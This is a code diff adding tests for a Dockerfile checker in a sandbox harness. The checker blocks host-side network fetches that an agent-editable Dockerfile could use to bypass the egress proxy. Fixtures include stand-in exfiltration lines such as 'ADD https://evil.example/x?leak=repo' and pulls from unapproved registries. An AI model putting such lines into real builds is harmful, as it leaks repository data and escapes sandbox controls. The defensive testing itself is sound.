@@ -16,7 +16,7 @@ import { tmpdir } from "node:os";
 import { basename, dirname, join } from "node:path";
 import { fileURLToPath } from "node:url";
 import {
-  EnvironmentError, buildArgv, buildTag, canaryFor, check, compare, composeProjects, composeServices, declared, parseProbe, probeScript, resolveImage, runningServices, tagVersion, versionMatches,
+  BASE_IMAGE_REGISTRIES, EnvironmentError, buildArgv, buildTag, canaryFor, check, checkDockerfile, compare, composeProjects, composeServices, declared, parseProbe, probeScript, resolveImage, runningServices, tagVersion, versionMatches,
 } from "./environment.mjs";
 import { HarnessError, imageFor, run } from "./harness.mjs";
 import { detect } from "./sandbox.mjs";
@@ -100,6 +100,40 @@ const DEV = join(DEVDIR, "devcontainer.json");
     const LINK = join(PROJ, "escape");
     if (!existsSync(LINK)) symlinkSync(TMP, LINK);
     ok("a context that is a symlink out of the workspace is refused", code(() => buildArgv({ build: { dockerfile: "Dockerfile", context: "../escape" } }, DEV, { workspace: PROJ })) === "BUILD_OUTSIDE_WORKSPACE");
+  }
+  {
+    // Independent security re-review (E-5): `podman build --network none`
+    // covers RUN only. ADD <url> and the FROM pull happen on the host, from the
+    // agent-editable Dockerfile, around the egress proxy.
+    const f = (text, args) => checkDockerfile(text, { args });
+    ok("the registries a base image may come from are docker.io and localhost, and nothing else", [...BASE_IMAGE_REGISTRIES].sort().join(",") === "docker.io,localhost");
+    ok("a plain Dockerfile has no host fetches", f("FROM node:22-alpine\nCOPY stamp.txt /stamp.txt\nRUN echo hi\n").length === 0);
+    ok("a fully-qualified docker.io image is fine", f("FROM docker.io/library/node:22-alpine\n").length === 0);
+    ok("a localhost image is fine (a previous build's tag)", f("FROM localhost/caretaker-env-abc:latest\n").length === 0);
+    ok("a stage alias is not a pull", f("FROM node:22 AS build\nFROM build\nFROM scratch\n").length === 0);
+    ok("ADD with a URL is a host fetch", /ADD .* fetches a URL/.test(f("FROM node:22\nADD https://evil.example/x?leak=repo /x\n")[0] ?? ""), JSON.stringify(f("FROM node:22\nADD https://evil.example/x /x\n")));
+    ok("…so is a git URL, and a URL hidden behind --chown", f("FROM node:22\nADD --chown=1:1 git@github.com:a/b.git /x\n").length === 1);
+    ok("…so is a URL behind a line continuation", f("FROM node:22\nADD \\\n  http://evil.example/x \\\n  /x\n").length === 1);
+    ok("ADD of a local path is not", f("FROM node:22\nADD ./dir /x\nADD a.tar.gz b.txt /y/\n").length === 0);
+    ok("FROM another registry is a host fetch, named", /FROM .* pulls from evil\.example/.test(f("FROM evil.example/img:1\n")[0] ?? ""), JSON.stringify(f("FROM evil.example/img:1\n")));
+    ok("…including a registry with a port, and ghcr.io", f("FROM evil.example:5000/img\nFROM ghcr.io/a/b\n").length === 2);
+    ok("a FROM through a build arg resolves before it is judged", f("ARG BASE\nFROM ${BASE}\n", { BASE: "node:22" }).length === 0 && f("ARG BASE\nFROM ${BASE}\n", { BASE: "evil.example/x" }).length === 1);
+    ok("…and through an ARG default", f("ARG BASE=node:22\nFROM $BASE\n").length === 0);
+    ok("a FROM nothing resolves is refused, not guessed", /cannot be resolved/.test(f("FROM ${BASE}\n")[0] ?? ""));
+    ok("a comment is not an instruction", f("# ADD https://x/y /z\nFROM node:22\n").length === 0);
+    // Through buildArgv: refused by name before any podman call, only with no build network.
+    const DF = join(DEVDIR, "Dockerfile");
+    writeFileSync(DF, "FROM node:22\nADD https://evil.example/x /x\n");
+    ok("buildArgv refuses a Dockerfile that would fetch on the host, by name", code(() => buildArgv({ build: { dockerfile: "Dockerfile" } }, DEV, { workspace: PROJ })) === "BUILD_FETCHES");
+    ok("…and resolveImage never reaches podman for it", (() => {
+      let ran = false;
+      const c = code(() => resolveImage({ dev: { build: { dockerfile: "Dockerfile" } }, devcontainerPath: DEV, workspace: PROJ, exec: () => { ran = true; return { status: 0 }; } }));
+      return c === "BUILD_FETCHES" && !ran;
+    })());
+    ok("a named build network lifts it, and that run is already warned", Array.isArray(buildArgv({ build: { dockerfile: "Dockerfile" } }, DEV, { workspace: PROJ, network: "host" })));
+    writeFileSync(DF, "FROM node:22\nCOPY stamp.txt /stamp.txt\n");
+    ok("a clean Dockerfile builds with no network", buildArgv({ build: { dockerfile: "Dockerfile" } }, DEV, { workspace: PROJ })[2] === "none");
+    rmSync(DF);
   }
 
   const calls = [];
